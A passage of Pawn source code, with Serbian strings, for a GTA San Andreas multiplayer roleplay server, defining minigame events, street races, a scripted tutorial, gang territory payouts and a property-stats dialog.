        PlayerInfo[playerid][xWanted] = 0;
        Novi_SetPlayerWantedLevel(playerid, 0);
        PlayerInfo[playerid][xZatvorVreme] += 15;
        return 1;
    }
    SendInfoMessage(playerid, "Beg uspesan!");
    BezanjeZatvor[playerid] = 0;
    PlayerInfo[ playerid ][ xZatvor ] = 0;
    PlayerInfo[ playerid ][ xZatvorVreme ] = 0;
    return 1;
}

timer InterpolacijaTut2[7000](playerid)
{
    InterpolateCameraPos(playerid, 2579.931884, -1301.240112, 1061.587036, 2547.168701, -1280.085205, 1064.278320, 10000);
    InterpolateCameraLookAt(playerid, 2575.218505, -1299.574584, 1061.684692, 2549.398193, -1284.266113, 1062.681762, 10000);

    // defer loginTimer(playerid);

    SPD( playerid, dialog_LOGIN, DSP, D_NASLOV, sDStrg, D_ODABERI, D_ODUSTANI );
    return 1;
}

// ============================= NOVE VIP KOMANDE by V01D ==========================
CMD:vipgotoimovina(playerid) {

    if(PlayerInfo[playerid][xVIPLevel] != 6) return SendErrorMessage(playerid, "Samo VIP 6!");
    ShowPlayerDialog(playerid, dialog_VipImovina, DIALOG_STYLE_INPUT, "Vip Imovina Goto", "Unesi ID imovine", "Potvrdi", "Odustani");
    return 1;
}

// ============================ ULICNE TRKE by V01D ================================
CMD:ulicnetrke(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 1792.8724,-1927.1606,13.3891)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(StartnaLinijaUT == 1) return SendErrorMessage(playerid, "Startna linija je trenutno zauzeta!");
    if(UlicneTrkeID[playerid] >= 0) return SendErrorMessage(playerid, "Vec si pozvao nekoga! Sacekaj odgovor ili /obustavitrku");
    new hours;
    gettime(hours);
    if(hours > 7 && hours < 20) return SendErrorMessage(playerid, "Trke mozes samo od 20:00 do 07:00!");
    ShowPlayerDialog(playerid, dialog_UlicneTrkeIgrac, DSI, D_NASLOV, "Unesite ID igraca protiv kojeg zelite da se trkate", "Potvrdi", "Odustani");
    return 1;
}

CMD:obustavitrku(playerid) {

    if(UlicneTrkeID[playerid] == -1) return SendErrorMessage(playerid, "Nisi nikoga pozvao na trku!");

    UlicneTrkeID[playerid] = -1;
    UlicneTrkeUlog[playerid] = 0;

    SendInfoMessage(playerid, "Uspesno si obustavio trku!");

    return 1;
}

timer PocetakUlicnihTrka[1000](playerid, id) {

    if(PocetakTrkaCount[playerid] != 0)
    {
        PocetakTrkaCount[playerid]--;
        PocetakTrkaCount[id]--;
        va_GameTextForPlayer(id, "%d sekundi", 1000, 3, PocetakTrkaCount[id]);
        va_GameTextForPlayer(playerid, "%d sekundi", 1000, 3, PocetakTrkaCount[playerid]);
        defer PocetakUlicnihTrka(playerid, id);
    }
    else
    {
        PocetakTrkaCount[playerid] = 0;
        StartnaLinijaUT = 0;
        UlicneTrkeCP[playerid] = 1;
        UlicneTrkeCP[id] = 1;
        Novi_SetPlayerCheckpoint(playerid, 1821.8723,-1836.2388,13.1204, 10.0);
        Novi_SetPlayerCheckpoint(id, 1821.8723,-1836.2388,13.1204, 10.0);
        SendInfoMessage(playerid, "Trke su pocele!!");
        SendInfoMessage(id, "Trke su pocele!!");
        TogglePlayerControllable(playerid, 1);
        TogglePlayerControllable(id, 1);
        return 1;
    }
    return 1;
}

timer PDKapijaTimer[12000]() {

    MoveDynamicObject(PDKapija, 1041.1595, -1416.1842, 13.0604, 7.0, 0.0000, -90.0000, 0.0000);
    return 1;
}

//===================== HOT RUN KOMANDE ====================================//

CMD:pokrenihotrun(playerid) {

    if(!isClanAdministracije(playerid)) return SendHotRun(playerid, "Samo admini i helperi!");
    if( !AdminDuty[ playerid ] ) return SendHotRun( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
    if(HotRunPokrenut) return SendHotRun(playerid, "Hunger Games je vec pokrenut!");
    va_SendClientMessageToAll(0xC34848FF, "Admin %s je pokrenuo Hot Run! /joinhotrun", ImeIgraca(playerid));
    HotRunPokrenut = true;
    HotRunPocinje = false;
    return 1;
}

CMD:joinhotrun(playerid) {

    if(!HotRunPokrenut) return SendHotRun(playerid, "Hot Run nije pokrenut!");
    if(HotRunIgra[playerid]) return SendHotRun(playerid, "Vec si na eventu!");
    if(HotRunPocinje) return SendHotRun(playerid, "Event jos malo pocinje!");
    if(HotRunIgraci == 20) return SendHotRun(playerid, "Slotovi su puni!");

    if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Game Helper?" );
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
    if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
    if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
    if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
    if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
    
    ShowPlayerDialog( playerid, 0, DSMSG, "Hot Run Event",
            ""col_white"Po mapi se na svakih 10 sekundi pojavi eksplozija! Poenta igre je da trcite i pokusate da je izbegnete\n" \
            "Poslednji preziveli je pobednik", "U redu", "");

    Novi_SetPlayerHealth(playerid, 15.0);
    Novi_SetPlayerArmour(playerid, 0.0);

    SendHotRun(playerid, "Usao si u Hot Run!Igra uskoro pocinje, srecno! Da napustis HotRun koristi /napustihr");
    HotRunIgra[playerid] = true;
    HotRunIgraci++;

    //Poostavi poziciju
    Novi_SetPlayerPos(playerid, -2313.9709,905.7208,59.5650);

    //TogglePlayerControllable(playerid, 0);

    Iter_Add(HotRunPlayers, playerid);
    
    va_SendClientMessageToAll(0xC34848FF, "(HotRun) : {FFFFFF}Igrac %s se pridruzio Hot Run-u! Igraca : %d!", ImeIgraca(playerid), HotRunIgraci);
    return 1;

}

CMD:napustihr(playerid) {

    if(!HotRunPokrenut) return SendHotRun(playerid, "Hot Run nije pokrenut!");
    if(!HotRunIgra[playerid]) return SendHotRun(playerid, "Nisi na eventu!");
    if(HotRunIgraci == 2) return SendHotRun(playerid, "Ostao si ti i jos jedan ucesnik! Ne mozes to!");

    HotRunIgra[playerid] = false;
    HotRunIgraci--;
    SpawnPlayer(playerid);
    SendHotRun(playerid, "Napustio si HotRun!");
    Iter_Remove(HotRunPlayers, playerid);
    return 1;
}

CMD:hrcount(playerid) {

    if(!isClanAdministracije(playerid)) return SendHotRun(playerid, "Samo admini i helperi!");
    if(!HotRunPokrenut) return SendHotRun(playerid, "Hot Run nije pokrenut!");
    if(HotRunIgraci < 2) return SendHotRun(playerid, "Nema dovoljno igraca!");
    HotRunPocinje = true;
    foreach(new hotrun : HotRunPlayers)
    {
        SendHotRun(hotrun, "Igra pocinje za 5 sekundi!");
        SetTimer("hrcount4",1000,0);
        SetTimer("hrcount3",2000,0);
        SetTimer("hrcount2",3000,0);
        SetTimer("hrcount1",4000,0);
        SetTimer("hrcountgo",5000,0);
    }
    return 1;
}

CMD:zaustavihotrun(playerid, params[])
{
    if(!isClanAdministracije(playerid)) return SendHotRun(playerid, "Samo admini i helperi!");
    if(!HotRunPokrenut) return SendHotRun(playerid, "HotRun nije pokrenut!");
    HotRunPokrenut = false;
    HotRunIgraci = 0;
    HotRunPocinje = false;
    foreach(new igraci : HotRunPlayers) {
        
        HotRunIgra[playerid] = false;
        SpawnPlayer(igraci);

    }
    Iter_Clear(HotRunPlayers);
    SendClientMessageToAll(0xC34848FF, "(HotRun) : {FFFFFF}Administrator je zaustavio HotRun!");
    return 1;
}

forward hrcount4();
forward hrcount3();
forward hrcount2();
forward hrcount1();
forward hrcountgo();

public hrcount4()
{
    foreach(new igraci : HotRunPlayers)
    {
        GameTextForPlayer(igraci, "4", 1000, 3);
    }
}

public hrcount3()
{
    foreach(new igraci : HotRunPlayers)
    {
        GameTextForPlayer(igraci, "3", 1000, 3);
    }
}

public hrcount2()
{
    foreach(new igraci : HotRunPlayers)
    {
        GameTextForPlayer(igraci, "2", 1000, 3);
    }
}

public hrcount1()
{
    foreach(new igraci : HotRunPlayers)
    {
        GameTextForPlayer(igraci, "1", 1000, 3);
    }
}

public hrcountgo()
{
    foreach(new igraci : HotRunPlayers) {

        GameTextForPlayer(igraci, "IGRA POCELA!", 1000, 3);    
    }

    defer HotRunEksplozijaTimer();
}

timer HotRunEksplozijaTimer[5000]() {

    if(!HotRunPokrenut) return 0;

    new PosX = RandomNew(2298, 2334) * (-1);
    new PosY = RandomNew(885, 929);
    new Float:PosZ = 59.5703;
    CreateExplosion(PosX, PosY, PosZ, 0, 25.0);
    defer HotRunEksplozijaTimer();
    return 1;
}

//================================ Tutorial by V01D ==================

// Tutorial(playerid)
// {
//     SetSpawnInfo(playerid, 0, 72, 2309.4019,-1195.1851,25.1111,271.1337, 0, 0, 0, 0, 0, 0);
//     SetPlayerVirtualWorld(playerid, playerid+1);
//     MichaelActor[playerid] = CreateDynamicActor(29, 2339.2600,-1203.2943,27.9766, 54.9081, 1, 100.0, playerid+1, -1, -1, 40.0, -1, 0);
//     ApplyDynamicActorAnimation(MichaelActor[playerid], "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
//     SpawnPlayer(playerid);
// }

//========================================== [ TIMERI ] =========================================//

timer SudjenjePricaTimer[5000](playerid) //Ovo je zanimljivo, prica sudija na svakih 5 sekundi
{
    switch(SudjenjePrica[playerid])
    {
        case 5:
        {
            TutorialMessage(playerid, "Sudija: Zbog svojih prekrsaja..");
            SudjenjePrica[playerid]--;
            defer SudjenjePricaTimer(playerid);
            return 1;
        }
        case 4:
        {
            TutorialMessage(playerid, "Sudija: I zbog ubistva naseg kolege..");
            SudjenjePrica[playerid]--;
            defer SudjenjePricaTimer(playerid);
            return 1;
        }
        case 3:
        {
            TutorialMessage(playerid, "Sudija: Bicete kaznjeni novcanom kaznom i zatvorom od 3 godine.");
            SudjenjePrica[playerid]--;
            defer SudjenjePricaTimer(playerid);
            return 1;
        }
        case 2:
        {
            TutorialMessage(playerid, "Sudija: Sva trenutna imovina ce vam biti oduzeta..");
            SudjenjePrica[playerid]--;
            defer SudjenjePricaTimer(playerid);
            return 1;
        }
        case 1:
        {
            TutorialMessage(playerid, "Sudija: A sada mi vodite ovog kriminalca sa ociju!!");
            SudjenjePrica[playerid]--;
            defer SudjenjePricaTimer(playerid);
            return 1;
        }
        case 0:
        {
            PlayerTextDrawShow(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
            PlayerTextDrawShow(playerid, TeksticTD[playerid]);
            PlayerTextDrawSetString(playerid, TeksticTD[playerid], "Zatvor.."); //Podesimo tekst
            ZatvorenikActor[playerid] = CreateDynamicActor(179, 91.4992,1826.1066,-7.9299,304.6137, 1, 100.0, playerid+1, -1, -1, 40.0, -1, 0);
            defer ZatvorTimer(playerid); //Pokrenemo timer
            return 1;
        }
    }
    return 1;
}

timer MichaelPricaTimer[5000](playerid) //Ovo je kada Michael prica, isto funkcionise kao ovaj gore, samo sto ovde imas animaciju
{
    switch(MichaelPricaVarijabla[playerid])
    {
        case 7:
        {
            TutorialMessage(playerid, "Michael: Sta ti je buraz? Zasto si tako smoren?");
            ApplyDynamicActorAnimation(MichaelActor[playerid],  "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 5000);
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 6:
        {
            ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Igrac: Nista me ne pitaj! Zena me je ostavila!");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 5:
        {
            ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Igrac: Izbacila me je iz stana, sada sam na ulici!");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 4:
        {
            ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Igrac: Ne znam sta da radim..");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 3:
        {
            ApplyDynamicActorAnimation(MichaelActor[playerid],  "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Michael: Hmmmm, prijatelj si mi, tako da ti mogu pomoci..");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 2:
        {
            ApplyDynamicActorAnimation(MichaelActor[playerid],  "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Michael: Imam jedan posao za tebe. Ilegala je, tako da razmisli o tome!");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 1:
        {
            ApplyAnimation(playerid, "PED", "IDLE_CHAT", 4.0, 0, 0, 0, 0, 0, 5000);
            TutorialMessage(playerid, "Igrac: Uradicu bilo sta da dokazem toj kurvi da mogu da uradim sve!!");
            MichaelPricaVarijabla[playerid]--;
            defer MichaelPricaTimer(playerid);
            return 1;
        }
        case 0:
        {
            ClearChat(playerid, 25);
            PlayerTextDrawShow(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
            PlayerTextDrawShow(playerid, TeksticTD[playerid]);
            PlayerTextDrawSetString(playerid, TeksticTD[playerid], "Mesec dana kasnije..");
            DestroyDynamicActor(MichaelActor[playerid]);
            defer MesecDanaKasnije(playerid);
            return 1;
        }
    }
    return 1;
}

timer MesecDanaKasnije[7000](playerid) //Ovo je timer mesec dana kasnije, uglavnom nista spec, daje ti oruzije i idi ubi pandura
{
    //SetPlayerWorldBounds(playerid, 2381, -1206.2, 2414, -1179.2);
    Novi_SetPlayerPos(playerid, 2544.4519,-1197.1022,59.0953);
    PoliceActor[playerid] = CreateActor(304, 2558.7048,-1210.6499,54.5313,92.5554);
    SetActorInvulnerable(PoliceActor[playerid], 0);
    SetActorVirtualWorld(PoliceActor[playerid], playerid+1);
    SetPlayerFacingAngle(playerid, 183.3996);
    SetCameraBehindPlayer(playerid);
    Novi_SetPlayerCheckpoint(playerid, 2558.7048,-1210.6499,54.5313, 3.0);
    GiveWeaponToPlayer(playerid, 24, 15);
    TogglePlayerControllable(playerid, 0);
    TutorialMessage(playerid, "Resi se inspektora koji te prati!");
    TutorialCP[playerid] = 0;
    defer MiniTimer2(playerid); //Jos jedan timer, videces sta radi
    return 1;
}

timer ZatvorTimer[7000](playerid) //Ovo je kada ga stavi u zatvor, vrsi se interpolacija kamere i pokaze reg dialog, takodje sredi reg dialog na svoj
{
    ClearChat(playerid, 25);
    DestroyDynamicActor(AdvokatActor[playerid]);
    Novi_SetPlayerPos(playerid, 91.9982,1824.3704,-7.9299);
    SetPlayerFacingAngle(playerid, 264.5067);
    InterpolateCameraPos(playerid, 95.995323, 1830.958129, -6.946393, 97.513610, 1823.095214, -7.386611, 7000);
    InterpolateCameraLookAt(playerid, 91.325439, 1829.219970, -7.359985, 92.544631, 1823.581665, -7.117213, 7000);
    PlayerTextDrawHide(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
    PlayerTextDrawHide(playerid, TeksticTD[playerid]);
    defer NoviTimer(playerid);
    return 1;
}

timer SudjenjePocinjeTimer[7000](playerid) //Ovo je kada sudjenje pocne, nista komplikovano
{
    //SetPlayerWorldBounds(playerid,20000.0000,-20000.0000,20000.0000,-20000.0000);
    Novi_SetPlayerPos(playerid, 130.3897,1837.4139,-9.2481);
    SetPlayerFacingAngle(playerid, 48.6180);
    SetPlayerCameraPos(playerid, 121.788574, 1843.842163, -5.338693);
    TogglePlayerControllable(playerid, 0);
    SetPlayerCameraLookAt(playerid, 126.180389, 1841.688110, -6.374112, CAMERA_CUT);
    PlayerTextDrawHide(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
    PlayerTextDrawHide(playerid, TeksticTD[playerid]);
    ClearChat(playerid, 25);
    defer SudjenjePricaTimer(playerid); //Pokrece se sudija kako prica
    SudjenjePrica[playerid] = 5;
    return 1;
}

timer MiniTimer[2000](playerid) //Ovo je mini timer 1, sluzi da malo lepse izgleda sve ovo
{
    PlayerTextDrawShow(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
    PlayerTextDrawShow(playerid, TeksticTD[playerid]);
    PlayerTextDrawSetString(playerid, TeksticTD[playerid], "Sudjenje..");
    DestroyActor(PoliceActor[playerid]);
    AdvokatActor[playerid] = CreateDynamicActor(147, 130.8615,1843.5697,-9.2481,122.5887, 1, 100.0, playerid+1, -1, -1, 40.0, -1, 0);
    defer SudjenjePocinjeTimer(playerid);
    return 1;
}

timer MiniTimer2[2000](playerid) //Isto kao ovaj gornji, radi izgleda 
{
    PlayerTextDrawHide(playerid, CrniTD[playerid]); //Prikazemo tdove igracu
    PlayerTextDrawHide(playerid, TeksticTD[playerid]);
    TogglePlayerControllable(playerid, 1);
    return 1;
}

timer NoviTimer[7000](playerid) {

    UTutorialu[playerid] = false;

    ClearChat( playerid, 25 );

    RegisterTDControl( playerid, true );
    DestroyDynamicActor(ZatvorenikActor[playerid]);
    IgracSeRegistruje[ playerid ] = true;
    SelectTextDraw( playerid, 0x37672AFF );

    return 1;
}

task SpecZonaTimer[3600000]() { //Zone dobijanje

    for( new id = 1; id < MAX_GZONE; id++ ) {

        new filename[ 32 ];
        format( filename, sizeof( filename ), F_GZONE, id );

        if( fexist( filename ) ) {

            if(gZoneInfo[id][gZoneVrsta] == 1) {

                if( gZoneInfo[ id ][ gZoneTaken ] && gZoneInfo[id][gZoneGangID] != -1) {

                    new wFile[40];
                    format(wFile, 40, O_FILE, gZoneInfo[ id ][ gZoneGangID ]);
                    if(fexist(wFile)) {

                        new novac, OrgID = gZoneInfo[id][gZoneGangID];

                        novac += RandomNew(15000, 20000);

                        OI[ OrgID ][ oSafeMoney ] += novac;
                        SaveOrganization( OrgID );

                        foreach(Player, i) {

                            if(PlayerInfo[i][xClan] == OrgID || PlayerInfo[i][xLider] == OrgID) {

                                SendClientMessageEx( i, ZUTA, "%s | Dobili ste %d zbog zauzete specijalne teritorije.", OI[ OrgID ][ oPreFix ], novac );
                                return 1;
                            }
                        }
                    }
                    else {

                        gZoneInfo[ id ][ gZoneTaken ] = false;
                        gZoneInfo[ id ][ gZoneTakeable ] = true;
                        gZoneInfo[ id ][ gZoneTime ] = 0;
                        GZone_Refresh(id);
                        GZone_Save(id);
                    }

                }
            }

            if(gZoneInfo[id][gZoneVrsta] == 2) {

                if( gZoneInfo[ id ][ gZoneTaken ] && gZoneInfo[id][gZoneGangID] != -1) {

                    new wFile[40];
                    format(wFile, 40, O_FILE, gZoneInfo[ id ][ gZoneGangID ]);
                    if(fexist(wFile)) {

                        new mats, OrgID = gZoneInfo[id][gZoneGangID];

                        mats += RandomNew(30, 50);

                        OI[ OrgID ][ oMaterijali ] += mats;
                        SaveOrganization( OrgID );

                        foreach(Player, i) {

                            if(PlayerInfo[i][xClan] == OrgID || PlayerInfo[i][xLider] == OrgID) {

                                SendClientMessageEx( i, ZUTA, "%s | Dobili ste %d materijala zbog zauzete specijalne teritorije.", OI[ OrgID ][ oPreFix ], mats );
                                return 1;
                            }
                        }
                    }
                    else {

                        gZoneInfo[ id ][ gZoneTaken ] = false;
                        gZoneInfo[ id ][ gZoneTakeable ] = true;
                        gZoneInfo[ id ][ gZoneTime ] = 0;
                        GZone_Refresh(id);
                        GZone_Save(id);
                    }

                }
            }  
        }
    }
    return 1;
}

//===================== DEAGLE MASTER KOMANDE ====================================//

CMD:pokrenideaglemaster(playerid) {

    if(!isClanAdministracije(playerid)) return SendDeagle(playerid, "Samo admini i helperi!");
    if( !AdminDuty[ playerid ] ) return SendDeagle( playerid, "Da bi koristili ovu komandu morate biti Administrator na duznosti." );
    if(DeagleMasterPokrenut) return SendDeagle(playerid, "Deagle Master je vec pokrenut!");
    va_SendClientMessageToAll(0xC34848FF, "Admin %s je pokrenuo DeagleMaster! /joindeaglemaster", ImeIgraca(playerid));
    DeagleMasterPokrenut = true;
    DeagleMasterPocinje = false;
    return 1;
}

CMD:joindeaglemaster(playerid) {

    if(!DeagleMasterPokrenut) return SendDeagle(playerid, "Deagle Master nije pokrenut!");
    if(DeagleMasterIgra[playerid]) return SendDeagle(playerid, "Vec si na eventu!");
    if(DeagleMasterPocinje) return SendDeagle(playerid, "Event jos malo pocinje!");
    if(DeagleMasterIgraci == 15) return SendDeagle(playerid, "Slotovi su puni!");

    if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Game Helper?" );
    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
    if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
    if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
    if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
    if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
    if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
    if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
    
    ShowPlayerDialog( playerid, 0, DSMSG, "Deagle Master Event",
            ""col_white"Na svakih 20 sekunda dobijate 3 metka digla i svaki igrac ima 50hp-a! Ili se pucajte ili bezite!\n" \
            "Poslednji preziveli je pobednik", "U redu", "");

    Novi_SetPlayerHealth(playerid, 50.0);
    Novi_SetPlayerArmour(playerid, 0.0);
    ResetPlayerWeapons(playerid);

    SendDeagle(playerid, "Usao si u Deagle Master!Igra uskoro pocinje, srecno! Da napustis Deagle Master koristi /napustidm");
    DeagleMasterIgra[playerid] = true;
    DeagleMasterIgraci++;

    //Poostavi poziciju

    switch(DeagleMasterIgraci)
    {
        case 1: { SetPlayerPos(playerid, -529.8510,-2982.6406,123.8210); }
        case 2: { SetPlayerPos(playerid, -499.2994,-2980.7771,123.8210); }
        case 3: { SetPlayerPos(playerid, -464.3882,-2986.8455,123.8210); }
        case 4: { SetPlayerPos(playerid, -432.2804,-2999.9055,123.8210); }
        case 5: { SetPlayerPos(playerid, -423.6060,-3028.5947,123.8210); }
        case 6: { SetPlayerPos(playerid, -426.5520,-3056.2468,123.8210); }
        case 7: { SetPlayerPos(playerid, -454.5047,-3080.4451,123.8210); }
        case 8: { SetPlayerPos(playerid, -502.7924,-3083.1091,123.8210); }
        case 9: { SetPlayerPos(playerid, -520.3874,-3061.7051,123.8210); }
        case 10: { SetPlayerPos(playerid, -532.5523,-3027.9617,123.8210); }
        case 11: { SetPlayerPos(playerid, -502.1393,-3039.2156,123.8210); }
        case 12: { SetPlayerPos(playerid, -474.4909,-3039.7078,123.8210); }
        case 13: { SetPlayerPos(playerid, -480.7421,-3019.0283,123.9120); }
        case 14: { SetPlayerPos(playerid, -503.8480,-2981.8232,123.9120); }
        case 15: { SetPlayerPos(playerid, -513.7540,-3007.2671,123.9120); }
    }

    TogglePlayerControllable(playerid, 0);

    Iter_Add(DeagleMasterPlayers, playerid);
    
    va_SendClientMessageToAll(0xC34848FF, "(DeagleMaster) : {FFFFFF}Igrac %s se pridruzio Deagle Masteru! Igraca : %d!", ImeIgraca(playerid), DeagleMasterIgraci);
    return 1;

}

CMD:napustidm(playerid) {

    if(!DeagleMasterPokrenut) return SendDeagle(playerid, "Deagle Master nije pokrenut!");
    if(!DeagleMasterIgra[playerid]) return SendDeagle(playerid, "Nisi na eventu!");
    if(DeagleMasterIgraci == 2) return SendDeagle(playerid, "Ostao si ti i jos jedan ucesnik! Ne mozes to!");

    DeagleMasterIgra[playerid] = false;
    DeagleMasterIgraci--;
    SpawnPlayer(playerid);
    SendDeagle(playerid, "Napustio si DeagleMaster!");
    Iter_Remove(DeagleMasterPlayers, playerid);
    return 1;
}

CMD:dmcount(playerid) {

    if(!isClanAdministracije(playerid)) return SendDeagle(playerid, "Samo admini i helperi!");
    if(!DeagleMasterPokrenut) return SendDeagle(playerid, "Deagle Master nije pokrenut!");
    if(DeagleMasterIgraci < 2) return SendDeagle(playerid, "Nema dovoljno igraca!");
    DeagleMasterPocinje = true;
    foreach(new deagleMaster : DeagleMasterPlayers)
    {
        SendDeagle(deagleMaster, "Igra pocinje za 5 sekundi!");
        SetTimer("dmcount4",1000,0);
        SetTimer("dmcount3",2000,0);
        SetTimer("dmcount2",3000,0);
        SetTimer("dmcount1",4000,0);
        SetTimer("dmcountgo",5000,0);
    }
    return 1;
}

CMD:zaustavidm(playerid, params[])
{
    if(!isClanAdministracije(playerid)) return SendDeagle(playerid, "Samo admini i helperi!");
    if(!DeagleMasterPokrenut) return SendDeagle(playerid, "Deagle Master nije pokrenut!");
    DeagleMasterPokrenut = false;
    DeagleMasterIgraci = 0;
    DeagleMasterPocinje = false;
    foreach(new igraci : DeagleMasterPlayers) {
        
        DeagleMasterIgra[igraci] = false;
        SpawnPlayer(igraci);

    }
    Iter_Clear(DeagleMasterPlayers);
    SendClientMessageToAll(0xC34848FF, "(DeagleMaster) : {FFFFFF}Administrator je zaustavio Deagle Master!");
    return 1;
}

forward dmcount4();
forward dmcount3();
forward dmcount2();
forward dmcount1();
forward dmcountgo();

public dmcount4()
{
    foreach(new igraci : DeagleMasterPlayers)
    {
        GameTextForPlayer(igraci, "4", 1000, 3);
    }
}

public dmcount3()
{
    foreach(new igraci : DeagleMasterPlayers)
    {
        GameTextForPlayer(igraci, "3", 1000, 3);
    }
}

public dmcount2()
{
    foreach(new igraci : DeagleMasterPlayers)
    {
        GameTextForPlayer(igraci, "2", 1000, 3);
    }
}

public dmcount1()
{
    foreach(new igraci : DeagleMasterPlayers)
    {
        GameTextForPlayer(igraci, "1", 1000, 3);
    }
}

public dmcountgo()
{
    foreach(new igraci : DeagleMasterPlayers) {

        GameTextForPlayer(igraci, "IGRA POCELA!", 1000, 3);    
        TogglePlayerControllable(igraci, 1);
        SendDeagle(igraci, "Uskoro cete dobiti deagle!");
    }

    defer DeagleMasterTimer();
}

timer DeagleMasterTimer[20000]() {

    if(!DeagleMasterPokrenut) return 0;

    foreach(new igraci : DeagleMasterPlayers) {

        ResetAllWeapons(igraci);
        GiveWeaponToPlayer(igraci, 24, 3);
    }

    defer DeagleMasterTimer();

    return 1;
}

ShowImovinaStatsCheck( playerid, targetid )
{
    if( IsPlayerConnected( playerid ) && IsPlayerConnected( targetid ) )
    {

        new str[1024];

        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

        strcat( DialogStrgEx, "{FFFFFF}** Statistika Imovine:\n\n" );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Imovine 1: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Imovine 2: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Imovine 3: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xProperty ][ 0 ], PlayerInfo[ targetid ][ xProperty ][ 1 ], PlayerInfo[ targetid ][ xProperty ][ 2 ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Firme: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 1: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 2: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xFirmaID ], PlayerInfo[ targetid ][ xVoziloID ][ 0 ], PlayerInfo[ targetid ][ xVoziloID ][ 1 ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Vozila 3: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Vozila 4: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Garaze: {FFFFFF}[%d]\n\n",
                PlayerInfo[ targetid ][ xVoziloID ][ 2 ], PlayerInfo[ targetid ][ xVoziloID ][ 3 ], PlayerInfo[ targetid ][ xGarageID ]);
        strcat( DialogStrgEx, str );

        format( str, sizeof( str ),
            ""SRVBOJA1SCM"Kljuc Radionice: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Bitcoin Workshopa: {FFFFFF}[%d]\n"SRVBOJA1SCM"Kljuc Naftne Platforme: {FFFFFF}[%d]\n\n",
                PlayerInfo[targetid][xWorkShopGarage], PlayerInfo[targetid][xWorkShopID], PlayerInfo[targetid][xNaftaID]);
        strcat( DialogStrgEx, str );

